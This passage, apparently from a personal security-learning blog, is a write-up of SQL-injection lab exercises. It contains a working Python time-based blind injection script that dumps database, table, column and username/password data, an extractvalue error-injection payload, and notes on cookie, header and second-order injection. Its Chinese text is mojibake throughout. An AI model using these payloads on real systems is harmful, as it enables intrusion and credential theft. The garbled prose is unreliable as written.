¸å¿ƒï¼šåˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹ï¼ˆæ—¶é—´ç›²æ³¨é å“åº”è€—æ—¶ï¼‰</span><br><span class="line"># æ¡ä»¶æˆç«‹ â†’ æ‰§è¡ŒSLEEP(3) â†’ å“åº”è€—æ—¶&gt;3ç§’ï¼›æ¡ä»¶ä¸æˆç«‹ â†’ ç«‹åˆ»è¿”å›</span><br><span class="line">def is_true(payload):</span><br><span class="line">    try:</span><br><span class="line">        # æ„é€ POSTè¡¨å•æ•°æ®ï¼šuname=æ³¨å…¥payloadï¼Œsubmit=Submitï¼ˆå¿…å¡«ï¼‰</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            &quot;uname&quot;: payload,</span><br><span class="line">            &quot;passwd&quot;: &quot;1&quot;,# åŸidå‚æ•°æ”¹ä¸ºuname</span><br><span class="line">            &quot;submit&quot;: &quot;Submit&quot;  # å¿…é¡»æºå¸¦çš„submitå‚æ•°</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()  # è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´</span><br><span class="line">        # å‘é€POSTè¯·æ±‚ï¼Œè¶…æ—¶è®¾ä¸º5ç§’ï¼ˆå¤§äºSLEEPçš„3ç§’ï¼‰</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            a_url,</span><br><span class="line">            data=post_data,  # ä¼ é€’è¡¨å•å‚æ•°</span><br><span class="line">            timeout=5,</span><br><span class="line">            allow_redirects=False</span><br><span class="line">        )</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        cost_time = end_time - start_time  # è®¡ç®—è€—æ—¶</span><br><span class="line">        # è€—æ—¶è¶…è¿‡3ç§’ â†’ æ¡ä»¶æˆç«‹</span><br><span class="line">        return cost_time &gt; 3</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        # è¶…æ—¶ä¹Ÿè¯´æ˜æ¡ä»¶æˆç«‹ï¼ˆSLEEPå¯¼è‡´è¶…æ—¶ï¼‰</span><br><span class="line">        return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;è¯·æ±‚å‡ºé”™: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"># è·å–ç›®æ ‡å­—ç¬¦ä¸²é•¿åº¦ï¼ˆæ—¶é—´ç›²æ³¨ç‰ˆï¼Œpayloadæ„é€ é€»è¾‘ä¸å˜ï¼‰</span><br><span class="line">def get_length(name):</span><br><span class="line">    for len_num in range(1, 100):</span><br><span class="line">        # payloadä»ä¸ºæ³¨å…¥è¯­å¥ï¼Œæœ€ç»ˆä¼ ç»™unameå­—æ®µ</span><br><span class="line">        payload = f&quot;1&#x27; and IF(length((&#123;name&#125;))=&#123;len_num&#125;, SLEEP(3), 0)--+&quot;</span><br><span class="line">        if is_true(payload):</span><br><span class="line">            print(f&quot;[&#123;name&#125;] é•¿åº¦: &#123;len_num&#125;&quot;)</span><br><span class="line">            return len_num</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"># é€å­—ç¬¦çˆ†ç ´ç›®æ ‡å­—ç¬¦ä¸²ï¼ˆæ—¶é—´ç›²æ³¨ç‰ˆï¼Œpayloadæ„é€ é€»è¾‘ä¸å˜ï¼‰</span><br><span class="line">def get_string(name, len_num):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    print(f&quot;å¼€å§‹çˆ†ç ´ [&#123;name&#125;]...&quot;)</span><br><span class="line">    for i in range(1, len_num + 1):</span><br><span class="line">        # ASCIIèŒƒå›´32-126ï¼ˆå¯æ‰“å°å­—ç¬¦ï¼‰</span><br><span class="line">        for asc in range(32, 127):</span><br><span class="line">            payload = f&quot;1&#x27; and IF(ascii(substr((&#123;name&#125;),&#123;i&#125;,1))=&#123;asc&#125;, SLEEP(3), 0)--+&quot;</span><br><span class="line">            if is_true(payload):</span><br><span class="line">                result += chr(asc)</span><br><span class="line">                # å®æ—¶æ‰“å°è¿›åº¦</span><br><span class="line">                print(f&quot;\rå½“å‰è¿›åº¦: &#123;result&#125;&quot;, end=&quot;&quot;)</span><br><span class="line">                break</span><br><span class="line">    print()  # æ¢è¡Œ</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># ä¸»ç¨‹åºå…¥å£</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # ========== 1. çˆ†ç ´æ•°æ®åº“å ==========</span><br><span class="line">    db_len = get_length(&quot;database()&quot;)</span><br><span class="line">    if db_len == 0:</span><br><span class="line">        print(&quot;æ•°æ®åº“åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    db_name = get_string(&quot;database()&quot;, db_len)</span><br><span class="line">    print(f&quot;âœ… æ•°æ®åº“å: &#123;db_name&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 2. çˆ†ç ´å½“å‰åº“çš„æ‰€æœ‰è¡¨å ==========</span><br><span class="line">    tables_sql = f&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;db_name&#125;&#x27;&quot;</span><br><span class="line">    tables_len = get_length(tables_sql)</span><br><span class="line">    if tables_len == 0:</span><br><span class="line">        print(&quot;è¡¨åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    tables = get_string(tables_sql, tables_len)</span><br><span class="line">    print(f&quot;âœ… æ‰€æœ‰è¡¨å: &#123;tables&#125;&quot;)</span><br><span class="line">    # æå–ç›®æ ‡è¡¨ï¼ˆä¼˜å…ˆusersï¼Œæ— åˆ™å–ç¬¬ä¸€ä¸ªè¡¨ï¼‰</span><br><span class="line">    table_list = tables.split(&#x27;,&#x27;)</span><br><span class="line">    target_table = &quot;users&quot; if &quot;users&quot; in table_list else table_list[0]</span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡è¡¨: &#123;target_table&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 3. çˆ†ç ´ç›®æ ‡è¡¨çš„æ‰€æœ‰åˆ—å ==========</span><br><span class="line">    cols_sql = f&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&#123;db_name&#125;&#x27; and table_name=&#x27;&#123;target_table&#125;&#x27;&quot;</span><br><span class="line">    cols_len = get_length(cols_sql)</span><br><span class="line">    if cols_len == 0:</span><br><span class="line">        print(&quot;åˆ—åé•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    cols = get_string(cols_sql, cols_len)</span><br><span class="line">    print(f&quot;âœ… ç›®æ ‡è¡¨åˆ—å: &#123;cols&#125;&quot;)</span><br><span class="line">    # æå–ç›®æ ‡åˆ—ï¼ˆä¼˜å…ˆusername/passwordï¼Œæ— åˆ™å–å‰ä¸¤åˆ—ï¼‰</span><br><span class="line">    col_list = cols.split(&#x27;,&#x27;)</span><br><span class="line">    target_cols = [c for c in [&quot;username&quot;, &quot;password&quot;] if c in col_list]</span><br><span class="line">    if not target_cols:</span><br><span class="line">        target_cols = col_list[:2]</span><br><span class="line">    print(f&quot;ğŸ” é€‰å®šç›®æ ‡åˆ—: &#123;target_cols&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # ========== 4. çˆ†ç ´ç›®æ ‡åˆ—çš„æ•°æ® ==========</span><br><span class="line">    for col in target_cols:</span><br><span class="line">        data_sql = f&quot;select group_concat(&#123;col&#125;) from &#123;target_table&#125;&quot;</span><br><span class="line">        data_len = get_length(data_sql)</span><br><span class="line">        if data_len == 0:</span><br><span class="line">            print(f&quot;&#123;col&#125; æ•°æ®é•¿åº¦çˆ†ç ´å¤±è´¥ï¼&quot;)</span><br><span class="line">            continue</span><br><span class="line">        data = get_string(data_sql, data_len)</span><br><span class="line">        print(f&quot;âœ… &#123;col&#125; æ•°æ®: &#123;data&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>æ”¹æˆpostå³å¯<br>16. â€œ)é—­åˆ æ—¶é—´ç›²æ³¨ ä¸Šé¢çš„è„šæœ¬å°±å¯ä»¥<br>17. passwordé‡Œé¢ å•å¼•å·é—­åˆ æŠ¥é”™æ³¨å…¥<br>18. ç”¨user-agentè¿›è¡ŒæŠ¥é”™æ³¨å…¥ çœ‹æºç  è¿˜éœ€è¦å¡«ä¸Šä¸¤ä¸ªå€¼ å¹¶ä¸”åŠ ä¸Šä¸€ä¸ªæ‹¬å·é‡æ–°é—­åˆ æ‰€ä»¥å¸¸è§„çš„æŠ¥é”™æ³¨å…¥ä¸è¡Œ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<ol start="19">
<li>referersæ³¨å…¥</li>
<li>cookieæ³¨å…¥ </li>
<li>cookieæ³¨å…¥ base64ç¼–ç  æ³¨é‡Šç¬¦å·ä¸èƒ½ç”¨äº† å°±ç”¨â€™1â€™&#x3D;â€™1  æ¥æ„é€ æ’çœŸæ¡ä»¶ è®©andåé¢çš„æ‰§è¡Œä½†æ˜¯æ²¡æœ‰æ„ä¹‰<br>é—­åˆè¯­æ³• + æ„é€ æ’çœŸæ¡ä»¶ åé¢çš„ä»£ç æ‰§è¡Œä½†æ— æ„ä¹‰</li>
<li>â€œé—­åˆ</li>
<li>â€˜é—­åˆ æ­£å¸¸æŸ¥è¯¢ åŠ ä¸Šâ€™1â€™&#x3D;â€™1é—­åˆå³å¯</li>
<li>ä¾é å¯†ç ä¿®æ”¹çš„åç«¯æ¼æ´ ä¿®æ”¹å¯†ç ç”¨æˆ·åé‚£é‡Œâ€™å¯ä»¥é—­åˆ ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡æå‰é—­åˆ æ¯”å¦‚æå‰çŸ¥æ™“ä¸€ä¸ªç”¨æˆ·åæ˜¯admin è‡ªå·±è®¾ç½®ä¸€ä¸ªç”¨æˆ·åä¸ºadminâ€™ é—­åˆä¹‹å åé¢æ³¨é‡Šæ‰ç°æœ‰å¯†ç çš„æ£€éªŒ è®©ä»–å¤±æ•ˆ ä¹Ÿå°±æ˜¯adminâ€™#11111ï¼ˆéšä¾¿åŠ çš„1 ä¸ç„¶æ„Ÿè§‰å¤ªæ˜æ˜¾äº† å…¶å®ä¹Ÿå¾ˆæ˜æ˜¾ï¼‰æœ€åä¿®æ”¹å¯†ç  å®åˆ™ä¿®æ”¹çš„æ˜¯adminçš„å¯†ç  æœ‰äº†å¯†ç ç™»é™†å³å¯ï¼ˆä¸‹æ¥æˆ‘ä¼šå»å¯»æ‰¾å…¶ä»–äºŒæ¬¡æ³¨å…¥çš„é¢˜ï¼‰</li>
<li>and or ä¸èƒ½ç”¨äº† å¯ä»¥ç”¨é€»è¾‘è¿ç®—ç¬¦&amp;&amp;ï¼Œ||ä»£æ›¿ è‡³äºåº“é‡Œé¢çš„or åŒå†™ç»•è¿‡å³å¯ è¿™é‡Œå…¶ä»–ç¼–ç ä¹Ÿä¸è¡Œ</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://xiexie-qiuligao.github.io">xiexie</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://xiexie-qiuligao.github.io/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/">http://xiexie-qiuligao.github.io/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://xiexie-qiuligao.github.io" target="_blank">Hexo</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0task/">å­¦ä¹ task</a></div><div class="post-share"><div class="social-share" data-image="/img/1.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/28/xss%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%9D%B6%E5%9C%BA/" title="xsså­¦ä¹ ä»¥åŠé¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">xsså­¦ä¹ ä»¥åŠé¶åœº</div></div><div class="info-2"><div class="info-item-1"> ä»€ä¹ˆæ˜¯xss  è·¨ç«™è„šæœ¬æ”»å‡» åŸç†æ˜¯æ“çºµå­˜åœ¨æ¼æ´çš„ç½‘ç«™ï¼Œä½¿å…¶å‘ç”¨æˆ·è¿”å›æ¶æ„ JavaScript ä»£ç ã€‚å½“æ¶æ„ä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ—¶ï¼Œæ”»å‡»è€…å°±èƒ½å®Œå…¨æ§åˆ¶ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚  XSSæ¦‚å¿µéªŒè¯  é€šè¿‡æ³¨å…¥ä¸€æ®µæœ‰æ•ˆè½½è·æ¥éªŒè¯å¤§å¤šæ•°ç±»å‹çš„ XSS æ¼æ´ï¼Œè¯¥æœ‰æ•ˆè½½è·ä¼šå¯¼è‡´æ‚¨çš„æµè§ˆå™¨æ‰§è¡Œä¸€äº›ä»»æ„ JavaScript ä»£ç ã€‚ç›¸å½“äºå°±æ˜¯å¿«é€Ÿæ£€æµ‹æ˜¯å¦æœ‰xssæ¼æ´ ã€‚åœ¨å¤§å¤šæ•°é¶åœºé‡Œé¢å¯ä»¥å¿«é€Ÿç”¨å‡½æ•°alert() çœ‹çœ‹ä¼šä¸ä¼šå‡ºç°å¼¹çª— åé¢alert()å‡½æ•°åœ¨æœ‰äº›æ— æ³•ä½¿ç”¨äº† ç”¨çš„æ˜¯print()  XSSæ”»å‡»ç±»å‹  XSSæ”»å‡»ä¸»è¦åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ï¼š  åå°„å‹ XSSï¼Œå…¶ä¸­æ¶æ„è„šæœ¬æ¥è‡ªå½“å‰çš„ H...</div></div></div></a><a class="pagination-related" href="/2025/01/07/upload%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/" title="uploadé¶åœºé‡åš"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">uploadé¶åœºé‡åš</div></div><div class="info-2"><div class="info-item-1"> å‰ç«¯éªŒè¯ å¯ä»¥ç¦ç”¨js æˆ–è€…æ˜¯å…ˆæ”¹åç¼€ ç„¶åæŠ“åŒ…æ”¹ æ£€æŸ¥content-type æŠ“åŒ…æ”¹ åœ¨apacheæ–‡ä»¶é‡Œé¢çœ‹å“ªäº›åç¼€ä¼šè¢«ä½œä¸ºphpæ–‡ä»¶è§£æ php php3 phtml .htaccess æ˜¯Apache æœåŠ¡å™¨ä¸“å±çš„ â€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼ˆNginx&#x2F; IIS æœåŠ¡å™¨ä¸æ”¯æŒ) ä½œç”¨æ˜¯ â€œå±€éƒ¨é…ç½®â€ï¼šä¸ç”¨ä¿®æ”¹ Apache çš„ä¸»é…ç½®æ–‡ä»¶ï¼Œåªéœ€æŠŠ.htaccess æ”¾åœ¨æŸä¸ªç›®å½•ä¸‹ï¼Œå°±èƒ½å¯¹è¿™ä¸ªç›®å½•åŠæ‰€æœ‰å­ç›®å½•ç”Ÿæ•ˆï¼›ä¿®æ”¹åä¸ç”¨é‡å¯ Apache æœåŠ¡å™¨ï¼Œä¿å­˜å°±ç”Ÿæ•ˆé‚£ä¹ˆè¿™é‡Œçš„æ”»å‡»å°±æ˜¯å…ˆä¸Šä¼ æ¶æ„çš„.htaccess æ–‡ä»¶ä¿®æ”¹ç›®å½•è§£æè§„åˆ™ï¼Œå†ä¸Šä¼ ä¼ªè£…æˆæ™®é€šæ–‡ä»¶çš„æ¶æ„è„šæœ¬ï¼Œè®©æœåŠ¡å™¨æŠŠè¿™...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/28/xss%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%9D%B6%E5%9C%BA/" title="xsså­¦ä¹ ä»¥åŠé¶åœº"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-28</div><div class="info-item-2">xsså­¦ä¹ ä»¥åŠé¶åœº</div></div><div class="info-2"><div class="info-item-1"> ä»€ä¹ˆæ˜¯xss  è·¨ç«™è„šæœ¬æ”»å‡» åŸç†æ˜¯æ“çºµå­˜åœ¨æ¼æ´çš„ç½‘ç«™ï¼Œä½¿å…¶å‘ç”¨æˆ·è¿”å›æ¶æ„ JavaScript ä»£ç ã€‚å½“æ¶æ„ä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ—¶ï¼Œæ”»å‡»è€…å°±èƒ½å®Œå…¨æ§åˆ¶ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚  XSSæ¦‚å¿µéªŒè¯  é€šè¿‡æ³¨å…¥ä¸€æ®µæœ‰æ•ˆè½½è·æ¥éªŒè¯å¤§å¤šæ•°ç±»å‹çš„ XSS æ¼æ´ï¼Œè¯¥æœ‰æ•ˆè½½è·ä¼šå¯¼è‡´æ‚¨çš„æµè§ˆå™¨æ‰§è¡Œä¸€äº›ä»»æ„ JavaScript ä»£ç ã€‚ç›¸å½“äºå°±æ˜¯å¿«é€Ÿæ£€æµ‹æ˜¯å¦æœ‰xssæ¼æ´ ã€‚åœ¨å¤§å¤šæ•°é¶åœºé‡Œé¢å¯ä»¥å¿«é€Ÿç”¨å‡½æ•°alert() çœ‹çœ‹ä¼šä¸ä¼šå‡ºç°å¼¹çª— åé¢alert()å‡½æ•°åœ¨æœ‰äº›æ— æ³•ä½¿ç”¨äº† ç”¨çš„æ˜¯print()  XSSæ”»å‡»ç±»å‹  XSSæ”»å‡»ä¸»è¦åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ï¼š  åå°„å‹ XSSï¼Œå…¶ä¸­æ¶æ„è„šæœ¬æ¥è‡ªå½“å‰çš„ H...</div></div></div></a><a class="pagination-related" href="/2025/01/07/upload%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/" title="uploadé¶åœºé‡åš"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-07</div><div class="info-item-2">uploadé¶åœºé‡åš</div></div><div class="info-2"><div class="info-item-1"> å‰ç«¯éªŒè¯ å¯ä»¥ç¦ç”¨js æˆ–è€…æ˜¯å…ˆæ”¹åç¼€ ç„¶åæŠ“åŒ…æ”¹ æ£€æŸ¥content-type æŠ“åŒ…æ”¹ åœ¨apacheæ–‡ä»¶é‡Œé¢çœ‹å“ªäº›åç¼€ä¼šè¢«ä½œä¸ºphpæ–‡ä»¶è§£æ php php3 phtml .htaccess æ˜¯Apache æœåŠ¡å™¨ä¸“å±çš„ â€œåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼ˆNginx&#x2F; IIS æœåŠ¡å™¨ä¸æ”¯æŒ) ä½œç”¨æ˜¯ â€œå±€éƒ¨é…ç½®â€ï¼šä¸ç”¨ä¿®æ”¹ Apache çš„ä¸»é…ç½®æ–‡ä»¶ï¼Œåªéœ€æŠŠ.htaccess æ”¾åœ¨æŸä¸ªç›®å½•ä¸‹ï¼Œå°±èƒ½å¯¹è¿™ä¸ªç›®å½•åŠæ‰€æœ‰å­ç›®å½•ç”Ÿæ•ˆï¼›ä¿®æ”¹åä¸ç”¨é‡å¯ Apache æœåŠ¡å™¨ï¼Œä¿å­˜å°±ç”Ÿæ•ˆé‚£ä¹ˆè¿™é‡Œçš„æ”»å‡»å°±æ˜¯å…ˆä¸Šä¼ æ¶æ„çš„.htaccess æ–‡ä»¶ä¿®æ”¹ç›®å½•è§£æè§„åˆ™ï¼Œå†ä¸Šä¼ ä¼ªè£…æˆæ™®é€šæ–‡ä»¶çš„æ¶æ„è„šæœ¬ï¼Œè®©æœåŠ¡å™¨æŠŠè¿™...</div></div></div></a><a class="pagination-related" href="/2025/01/05/%E5%A4%8D%E7%8E%B0CVE-2025-68664/" title="å¤ç°CVE-2025-68664"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-05</div><div class="info-item-2">å¤ç°CVE-2025-68664</div></div><div class="info-2"><div class="info-item-1">æ¼æ´åŸç†LangChainæ¡†æ¶åœ¨å¤„ç†LLMåº”ç”¨çš„å¤æ‚æ•°æ®ç»“æ„æ—¶ï¼Œé‡‡ç”¨äº†å®šåˆ¶çš„åºåˆ—åŒ–æœºåˆ¶ã€‚è¯¥æœºåˆ¶ä¸æ ‡å‡†JSONåºåˆ—åŒ–ä¸åŒï¼Œå®ƒä½¿ç”¨ç‰¹æ®Šçš„â€lcâ€é”®ä½œä¸ºå†…éƒ¨æ ‡è®°ï¼Œä»¥åŒºåˆ†æ™®é€šPythonå­—å…¸ä¸LangChainæ¡†æ¶å¯¹è±¡ lc æ˜¯ LangChain å†…éƒ¨æ ‡è¯†å­—æ®µ ä¸€æ—¦load()æˆ–loads()ååºåˆ—åŒ–æ—¶æ£€æµ‹åˆ° lcï¼Œå°±ä¼š æŒ‰ LangChain å¯¹è±¡è§£æ LangChain åœ¨ dumps() &#x2F; dumpd() åºåˆ—åŒ–ç”¨æˆ·æ•°æ®æ—¶  æ²¡æœ‰å¯¹ç”¨æˆ·å¯æ§å­—å…¸ä¸­çš„ lc å­—æ®µåšéš”ç¦»æˆ–è½¬ä¹‰ ä¼šè®©LangChain è¯¯ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„å†…éƒ¨å¯¹è±¡ ç‰ˆæœ¬èŒƒå›´langchain-core &gt;&#...</div></div></div></a><a class="pagination-related" href="/2025/01/06/XXE/" title="XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-06</div><div class="info-item-2">XXE</div></div><div class="info-2"><div class="info-item-1">ä»€ä¹ˆæ˜¯XXEXXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®ä½“æ³¨å…¥ XMLæ³¨å…¥ åœ¨æå®¢2025é‡Œé¢åšè¿‡çš„ ç”¨svgæ ‡ç­¾æ¥å¾—åˆ° å½“ç„¶å¤ªå±€é™å±€é™äº† ç»§ç»­å¾€ä¸‹çœ‹ XML æ–‡ä»¶å¯ä»¥é€šè¿‡ â€œå¤–éƒ¨å®ä½“â€ï¼ˆDOCTYPE å£°æ˜ä¸­çš„ ENTITYï¼‰å¼•ç”¨å¤–éƒ¨èµ„æºï¼Œä½†å¦‚æœæœåŠ¡å™¨çš„ XML è§£æå™¨æœªç¦ç”¨å¤–éƒ¨å®ä½“åŠ è½½ï¼Œæ”»å‡»è€…å°±èƒ½æ„é€ æ¶æ„ XML å†…å®¹ï¼Œè¯±å¯¼è§£æå™¨æ‰§è¡Œéæ³•æ“ä½œï¼ˆæ¯”å¦‚è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ã€è®¿é—®å†…éƒ¨ç½‘ç»œç­‰ï¼‰ã€‚ åŸºç¡€çŸ¥è¯† DTD ç®€å•è¯´ç®€å•è¯´ï¼ŒDTD æ˜¯ XML çš„ â€œæ ¼å¼è¯´æ˜ä¹¦â€ï¼šè§„å®š XML é‡Œèƒ½å‡ºç°å“ªäº›å…ƒç´ ã€å±æ€§ï¼›å®šä¹‰å…ƒç´ çš„åµŒå¥—é¡ºåºã€æ¬¡æ•°ï¼›ç»Ÿä¸€ä¸åŒ XML...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xiexie</div><div class="author-info-description">æˆ‘çš„ä¸ªäººå­¦ä¹ åšå®¢</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiexie-qiuligao"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">åŸºç¡€è¯­æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by-ORDER-BY%E6%B5%8B%E5%88%97%E6%95%B0%E6%98%AFSQL-%E6%B3%A8%E5%85%A5%E4%B8%AD%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.</span> <span class="toc-text">order by ORDER BYæµ‹åˆ—æ•°æ˜¯SQL æ³¨å…¥ä¸­æœ€åŸºç¡€çš„æŠ€å·§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%83%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%EF%BC%9A%E6%9F%A5%E5%BA%93-%E8%A1%A8-%E5%88%97%EF%BC%88%E6%A0%B8%E5%BF%83%E4%B8%AD%E7%9A%84%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">å…ƒæ•°æ®æŸ¥è¯¢ï¼šæŸ¥åº“ &#x2F; è¡¨ &#x2F; åˆ—ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">æ•°æ®èšåˆ&#x2F;æ‹¼æ¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E9%A2%91%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.</span> <span class="toc-text">é«˜é¢‘å…³é”®å­—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp"><span class="toc-number">2.</span> <span class="toc-text">wp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.</span> <span class="toc-text">å¸ƒå°”ç›²æ³¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">æ—¶é—´ç›²æ³¨</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/28/xss%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%9D%B6%E5%9C%BA/" title="xsså­¦ä¹ ä»¥åŠé¶åœº">xsså­¦ä¹ ä»¥åŠé¶åœº</a><time 